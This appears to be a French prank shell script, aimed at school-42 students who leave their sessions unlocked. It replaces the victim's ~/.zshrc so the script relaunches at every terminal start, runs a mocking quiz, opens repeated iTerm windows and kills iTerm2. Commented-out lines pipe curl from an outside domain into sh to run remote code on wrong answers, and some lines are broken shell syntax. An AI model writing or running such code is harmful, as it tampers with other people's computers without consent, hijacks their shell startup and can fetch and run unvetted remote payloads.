#!/bin/sh

# by tvanbael
# 2023-06-06
# v 2.1

# Vérifier l'existence du fichier .zshrc
if [ ! -f ~/.sshfd ]; then
  if [ -f ~/.zshrc ]; then
    # Renommer le fichier .zshrc en .sshsd
    mv ~/.zshrc ~/.sshfd
    touch ~/.zshrc
    echo "/Users/$USER/Desktop/script_question.sh" >> ~/.zshrc
  else
    touch ~/.zshrc
    echo "/Users/$USER/Desktop/script_question.sh" >> ~/.zshrc
  fi
fi

finished=false

header() {
  clear
  echo ""
  echo ""
  echo ""
  echo ""
  echo ""
  sleep 0.10
  clear
  echo "████████ ██ ███    ███ ███████     ████████  ██████      ██████  ██       █████  ██    ██ "
  echo "   ██    ██ ████  ████ ██             ██    ██    ██     ██   ██ ██      ██   ██  ██  ██  "
  echo "   ██    ██ ██ ████ ██ █████          ██    ██    ██     ██████  ██      ███████   ████   "
  echo "   ██    ██ ██  ██  ██ ██             ██    ██    ██     ██      ██      ██   ██    ██    "
  echo "   ██    ██ ██      ██ ███████        ██     ██████      ██      ███████ ██   ██    ██    "
  sleep 0.10
}

timer() {
    sleep 1
    clear
    sleep 1
    echo "."
    sleep 1
    clear
    echo ".."
    sleep 1
    clear
    echo "..."
    sleep 1
    clear
}

winners() {
  echo "██╗   ██╗ ██████╗ ██╗   ██╗    ██╗    ██╗██╗███╗   ██╗    ██╗"
  echo "╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║    ██║██║████╗  ██║    ██║"
  echo " ╚████╔╝ ██║   ██║██║   ██║    ██║ █╗ ██║██║██╔██╗ ██║    ██║"
  echo "  ╚██╔╝  ██║   ██║██║   ██║    ██║███╗██║██║██║╚██╗██║    ╚═╝"
  echo "   ██║   ╚██████╔╝╚██████╔╝    ╚███╔███╔╝██║██║ ╚████║    ██╗"
  echo "   ╚═╝    ╚═════╝  ╚═════╝      ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝    ╚═╝"
  sleep 0.10
  clear
}

bad_idea() {
  clear
  echo "▀█████████▄     ▄████████ ████████▄        ▄█  ████████▄     ▄████████    ▄████████"
  echo "  ███    ███   ███    ███ ███   ▀███      ███  ███   ▀███   ███    ███   ███    ███"
  echo "  ███    ███   ███    ███ ███    ███      ███▌ ███    ███   ███    █▀    ███    ███"
  echo " ▄███▄▄▄██▀    ███    ███ ███    ███      ███▌ ███    ███  ▄███▄▄▄       ███    ███"
  echo "▀▀███▀▀▀██▄  ▀███████████ ███    ███      ███▌ ███    ███ ▀▀███▀▀▀     ▀███████████"
  echo "  ███    ██▄   ███    ███ ███    ███      ███  ███    ███   ███    █▄    ███    ███"
  echo "  ███    ███   ███    ███ ███   ▄███      ███  ███   ▄███   ███    ███   ███    ███"
  echo "▄█████████▀    ███    █▀  ████████▀       █▀   ████████▀    ██████████   ███    █▀ "
  sleep 0.10
  clear
}

# Fonction à exécuter en cas de capture du signal SIGINT
interrupt_handler() {
  if [ "$finished" = true ]; then
    clear
    # Vérifier l'existence du fichier .zshrc
    if [ -f ~/.zshrc ]; then
      # Renommer le fichier .zshrc en .sshsd
      killall "iTerm2"
      echo "" > ~/.zshrc
      killall "iTerm2"
      mv ~/.sshfd ~/.zshrc
      killall "iTerm2"
      # Supprime le fichier temporaire
      rm /tmp/top_output.txt
      exit 1
    fi
      exit 1
  fi
  clear
  echo "▀█████████▄     ▄████████ ████████▄        ▄█  ████████▄     ▄████████    ▄████████"
  echo "  ███    ███   ███    ███ ███   ▀███      ███  ███   ▀███   ███    ███   ███    ███"
  echo "  ███    ███   ███    ███ ███    ███      ███▌ ███    ███   ███    █▀    ███    ███"
  echo " ▄███▄▄▄██▀    ███    ███ ███    ███      ███▌ ███    ███  ▄███▄▄▄       ███    ███"
  echo "▀▀███▀▀▀██▄  ▀███████████ ███    ███      ███▌ ███    ███ ▀▀███▀▀▀     ▀███████████"
  echo "  ███    ██▄   ███    ███ ███    ███      ███  ███    ███   ███    █▄    ███    ███"
  echo "  ███    ███   ███    ███ ███   ▄███      ███  ███   ▄███   ███    ███   ███    ███"
  echo "▄█████████▀    ███    █▀  ████████▀       █▀   ████████▀    ██████████   ███    █▀ "

  echo "error ici2"
  sleep 3
  i=0
  while [ $i -lt 2 ]; do
  	osascript -e 'tell application "iTerm"
      	create window with default profile
      	tell current session of current window
            write text "printf \"\\033]0;On ne coupe pas la tete, elle repousse 3 fois!\\007\""
      	end tell
  	end tell'
    i=$((i+1))
  done
  # Ajoutez ici les actions que vous souhaitez effectuer lors de la capture du signal SIGINT
  exit 1
}

# Définit la fonction interrupt_handler comme gestionnaire du signal SIGINT
# trap interrupt_handler EXIT

# Question 1
clear
echo "\n\nTu as laisser ta session ouverte, dommage pour toi !\n\n"
echo "Jouons un peu !\n\n"
read -p "Let's go? : (appuis sur entree pour commencer.)" answer
# timer

nb=0
while [ $nb -lt 10 ]; do
  header
  nb=$((nb+1))
done
sleep 1.5

# Question 1
echo "Question 1"
sleep 2
clear
echo "Si je laisse des traces au fond des toilettes, que doit-je faire ?"
echo ""
echo "[1] : nettoyer"
echo "[2] : laisser comme ça, et me barrer en soumsoum"
echo ""

echo "(répond avec 1 ou 2 et valide ta réponsse avec la touche entrée)"

read -p "Votre réponse : " reponse

if [ "$reponse" = "1" ]; then
  clear
  echo "Bonne réponse !"
  echo tu vois rien de difficile !
  echo "Celle la etais simple! Je te laisse une chance de t'en sortir!"
  # ajoute dune attente utilisateur
  read -p "(Appuyer sur entree)" reponse
  # timer
  clear

  # Question 2
  echo "Question 2"
  echo "combien d'heure de TIG me valent la presence d'un contenant de liquide sur mon bureau ?"
  echo "[1] : 2h"
  echo "[2] : 4h"
  echo "[3] : 8h"
  echo "repond avec 1 2 ou 3 et valide ta réponsse avec la touche entrée"
  read -p "Votre réponse : " reponse2

  if [ "$reponse2" = "1" ]; then
    clear
    echo "Bonne réponse !"
    echo "Tu as de la chance, je suis de bonne humeur !"
    echo "Tu as gagné le droit de continuer à utiliser ton ordinateur !"
    echo "Ah non, c'est pas fini !"
    read -p "Appuyer sur entrée" reponse
    # timer
    clear
    # Question 3
    echo "Question 3"
    echo "A quoi sert le badge 42 ?\n\n\n\n"
    echo "Pret ?"
    read -p "(Appuyer sur entrée)"
    clear
    echo "[1]: éplucher des légumes, cuire un plat au four, assaisonner une salade."
    echo "[2]: changer une roue crevée, réparer un moteur défectueux, diagnostiquer un problème électrique."
    echo "[3]: calculer une intégrale triple, trouver les racines d'une équation polynomiale de degré élevé, établir une démonstration mathématique rigoureuse."
    echo "[4]: gratter les cordes d'une guitare, appuyer sur les touches d'un piano, souffler dans un saxophone."
    echo "[5]: tourner les pages d'un roman, analyser un poème en profondeur, comprendre les concepts complexes d'un manuel scientifique."
    echo "[6]: mélanger les couleurs sur une palette, appliquer des coups de pinceau précis, créer des textures et des effets visuels uniques."
    echo "[7]: courir sur un tapis roulant, lancer une balle de baseball avec précision, effectuer des exercices de musculation pour renforcer les muscles."
    echo "[8]: évaluer les conséquences de différentes actions, considérer les valeurs et les principes éthiques en jeu, peser les avantages et les inconvénients de chaque choix."
    echo "[9]: pratiquer la prononciation de nouveaux mots, acquérir du vocabulaire spécifique à la langue, comprendre et utiliser les règles grammaticales appropriées."
    echo "[10]: ressentir de la joie face à une expérience agréable, exprimer de la tristesse lors d'une perte, transmettre de l'amour et de l'affection à une personne proche."
    echo "[11]: résoudre des énigmes, développer des compétences en programmation, construire des structures en Lego."
    echo "[12]: photographier des paysages, capturer des moments précieux, réaliser des portraits artistiques."
    echo "[13]: planter des fleurs dans un jardin, cultiver des légumes, entretenir un espace vert."
    echo "[14]: créer des bijoux faits main, tricoter un pull, coudre une robe."
    echo "[15]: jouer au tennis, nager dans une piscine, pratiquer le yoga pour se détendre."
    echo "[16]: analyser des données statistiques, effectuer des prévisions financières, interpréter des résultats expérimentaux."
    echo "[17]: écrire un poème, rédiger un article, composer une chanson."
    echo "[18]: construire un meuble en bois, rénover une pièce, poser du carrelage."
    echo "[19]: discuter de politique, débattre de sujets d'actualité, échanger des idées avec des amis."
    echo "[20]: jouer avec un animal de compagnie, promener un chien, caresser un chat."
    echo "[21]: piloter un avion, conduire une voiture de course, faire du vélo."
    echo "[22]: apprendre à jouer d'un instrument de musique, danser sur une chorégraphie, chanter dans une chorale."
    echo "[23]: enseigner des concepts mathématiques, guider des élèves dans leurs études, organiser des activités éducatives."
    echo "[24]: concevoir des bâtiments, dessiner des plans architecturaux, créer des maquettes."
    echo "[25]: explorer la nature lors d'une randonnée, camper dans la forêt, observer les étoiles."
    echo "[26]: résoudre des problèmes de programmation, développer des applications informatiques, concevoir des sites web."
    echo "[27]: pratiquer des arts martiaux, faire du vélo tout-terrain, escalader des montagnes."
    echo "[28]: préparer des cocktails, expérimenter de nouvelles recettes, décorer des gâteaux."
    echo "[29]: écrire un journal intime, rédiger des lettres, rédiger un discours persuasif."
    echo "[30]: organiser un événement, planifier un voyage, gérer un projet."
    echo "[31]: sculpter une statue dans le marbre, modeler de l'argile, créer des œuvres en verre soufflé."
    echo "[32]: apprendre les bases de la programmation, comprendre les principes de la physique, étudier les courants philosophiques."
    echo "[33]: prendre des photos de mariage, immortaliser des moments spéciaux, documenter un voyage."
    echo "[34]: jouer au football, courir un marathon, pratiquer le basketball."
    echo "[35]: déboguer un code informatique, résoudre des problèmes techniques, configurer un réseau."
    echo "[36]: lire des romans historiques, se plonger dans la science-fiction, explorer des genres littéraires variés."
    echo "[37]: peindre un paysage, dessiner des portraits, expérimenter avec des techniques artistiques."
    echo "[38]: entretenir un jardin potager, faire pousser des plantes d'intérieur, créer un jardin vertical."
    echo "[39]: créer des vêtements uniques, customiser des accessoires, fabriquer des décorations faites main."
    echo "[40]: faire du jogging, faire de la natation synchronisée, pratiquer la danse classique."
    echo "[41]: analyser des données économiques, étudier les tendances du marché, élaborer des stratégies commerciales."
    echo "[42]: écrire des poèmes d'amour, rédiger des nouvelles fantastiques, composer des chansons engagées."
    echo "[43]: construire un meuble en utilisant des matériaux recyclés, restaurer un objet ancien, réparer des appareils électroménagers."
    echo "[44]: jouer au golf, faire du ski, faire du surf."
    echo "[45]: réaliser des expériences scientifiques, formuler des hypothèses, observer des phénomènes naturels."
    echo "[46]: écrire un scénario de film, réaliser un court-métrage, monter des vidéos créatives."
    echo "[47]: créer des modèles 3D, animer des personnages, concevoir des effets spéciaux."
    echo "[48]: pratiquer la méditation, participer à des séances de yoga, suivre des techniques de respiration."
    echo "[49]: aider les autres en tant que bénévole, soutenir des causes humanitaires, contribuer à des actions caritatives."
    echo "[50]: jouer avec des enfants, aider les personnes âgées, soutenir les membres de sa communauté."
    echo "[51]: pratiquer le tir à l'arc, jouer au tennis de table, s'initier à la boxe."
    echo "[52]: apprendre à improviser sur un instrument, composer des chansons originales, jouer dans un groupe de musique."
    echo "[53]: enseigner des langues étrangères, aider à préparer les examens, organiser des activités culturelles."
    echo "[54]: réaliser des vidéos de voyage, capturer des paysages naturels, documenter des traditions locales."
    echo "[55]: résoudre des énigmes mathématiques, développer des algorithmes, optimiser des processus."
    echo "[56]: écrire des critiques de films, analyser des œuvres littéraires, donner son avis sur des œuvres d'art."
    echo "[57]: construire une cabane en bois, rénover une maison, aménager un espace de travail."
    echo "[58]: débattre de questions philosophiques, analyser des théories scientifiques, discuter de sujets sociaux."
    echo "[59]: jouer avec des animaux sauvages dans un parc animalier, observer des oiseaux dans leur habitat naturel, nager avec des dauphins."
    echo "[60]: voler en parapente, faire du saut à l'élastique, essayer l'escalade en salle."
    echo "[61]: apprendre à jouer du violoncelle, perfectionner ses compétences en danse contemporaine, pratiquer l'art du jonglage."
    echo "[62]: enseigner des cours de physique, organiser des activités scientifiques, participer à des projets de recherche."
    echo "[63]: réaliser des photographies de mode, capturer des instants de vie, documenter des événements sportifs."
    echo "[64]: pratiquer la musculation, suivre des cours de fitness, faire de la gymnastique artistique."
    echo "[65]: analyser des données en utilisant des outils statistiques, modéliser des processus complexes, interpréter des résultats expérimentaux."
    echo "[66]: écrire un roman, rédiger des articles de blog, composer des paroles de chansons."
    echo "[67]: ouvrir les portes, passer les examens, prouver ton appartenance a l'ecole"
    echo "[68]: pratiquer des sports nautiques, faire de la plongée sous-marine, surfer sur les vagues."
    echo "[69]: coder un jeu vidéo, développer une application mobile, concevoir un site web interactif."
    echo "[70]: étudier les écosystèmes naturels, préserver la biodiversité, cultiver un jardin biologique."
    echo "[71]: créer des illustrations pour un livre, réaliser des bandes dessinées, concevoir des affiches artistiques."
    echo "[72]: organiser des événements sportifs, planifier des voyages d'aventure, coordonner des projets communautaires."
    echo "[73]: sculpter des statues en marbre, modeler des formes abstraites, créer des installations artistiques."
    echo "[74]: pratiquer la photographie de rue, capturer des moments de la vie quotidienne, réaliser des portraits de rue."
    echo "[75]: développer des applications web, concevoir des interfaces utilisateur, améliorer des sites existants."
    echo "[76]: pratiquer le football, courir des marathons, jouer au tennis."
    echo "[77]: résoudre des problèmes informatiques, configurer des réseaux, programmer des robots."
    echo "[78]: lire des romans classiques, étudier la philosophie, se plonger dans des ouvrages scientifiques."
    echo "[79]: peindre des paysages urbains, dessiner des croquis architecturaux, réaliser des portraits réalistes."
    echo "[80]: entretenir un jardin de plantes aromatiques, faire pousser des légumes biologiques, créer un jardin de plantes médicinales."
    echo "[81]: créer des vêtements de mode, coudre des accessoires originaux, réaliser des costumes pour des représentations théâtrales."
    echo "[82]: pratiquer la course à pied, nager pour se relaxer, participer à des séances de yoga."
    echo "[83]: analyser des données financières, étudier les marchés boursiers, élaborer des stratégies d'investissement."
    echo "[84]: écrire des poèmes engagés, rédiger des nouvelles fantastiques, composer des chansons inspirantes."
    echo "[85]: construire des meubles en bois, rénover des objets anciens, restaurer des pièces de collection."
    echo "[86]: jouer au golf, faire du ski, faire de la planche à voile."
    echo "[87]: réaliser des expériences scientifiques, observer des phénomènes naturels, formuler des hypothèses."
    echo "[88]: écrire un scénario de film, réaliser un court-métrage, monter des vidéos documentaires."
    echo "[89]: créer des modèles 3D, animer des personnages virtuels, concevoir des effets visuels pour le cinéma."
    echo "[90]: pratiquer la méditation, suivre des techniques de relaxation, participer à des retraites spirituelles."
    echo "[91]: aider les personnes dans le besoin, soutenir des causes humanitaires, contribuer à des projets bénévoles."
    echo "[92]: jouer avec des enfants, aider les personnes âgées, soutenir les personnes en situation de handicap."
    echo "[93]: pratiquer le tir à l'arc, jouer au tennis, s'initier à la boxe."
    echo "[94]: apprendre à jouer d'un instrument de musique, pratiquer le théâtre, se lancer dans la danse contemporaine."
    echo "[95]: enseigner des langues étrangères, aider à préparer les examens, organiser des échanges culturels."
    echo "[96]: réaliser des vidéos de voyage, documenter des événements, capturer des paysages naturels."
    echo "[97]: résoudre des problèmes mathématiques complexes, développer des algorithmes, étudier les principes scientifiques."
    echo "[98]: écrire des critiques artistiques, analyser des œuvres littéraires, discuter de sujets culturels."
    echo "[99]: construire des structures en Lego, créer des maquettes, réaliser des expériences scientifiques."
    echo "[100]: explorer la nature lors d'une randonnée, camper en pleine nature, observer les étoiles."
    echo ""
    echo ""
    echo ""

    echo "repond avec 1 ou 2 (flemme de t'ecrire jusque 100)et valide ta reponsse avec la touche entrée"
    read -p "Votre réponse : " reponse3
    if [ "$reponse3" = "67" ]; then
      echo "Bonne réponse !"
      read -p "Appuyer sur entree" reponse
      clear
      finished = true
      nbs = 0
      while [ $nbs -lt 15 ]; do
        winners
        nbs = $nbs + 1
      done
      clear
      # Vérifier l'existence du fichier .zshrc
      if [ -f ~/.zshrc ]; then
        # Renommer le fichier .zshrc en .sshsd
        killall "iTerm2"
        echo "" > ~/.zshrc
        killall "iTerm2"
        mv ~/.sshfd ~/.zshrc
        killall "iTerm2"
        # Supprime le fichier temporaire
        rm /tmp/top_output.txt
        exit 1
      fi
    else
      echo "Mauvaise réponse !"
      # curl 21.loundor.com/1 | sh
    fi
  else
    echo "Mauvaise réponse !"
    sleep 3
    i=0
    while [ $i -lt 5 ]; do
    	osascript -e 'tell application "iTerm"
        	create window with default profile
        	tell current session of current window
              write text "printf \"\\033]0;echo Il fait chaud!\\007\""
        	end tell
    	end tell'
      i=$((i+1))
    done
  fi
else
  clear
  echo "Mauvaise réponse ! Et a la question une ! Tu n'a vraiment rien lu du reglement !"
  sleep 2
  # curl 21.loundor.com/3 | sh
fi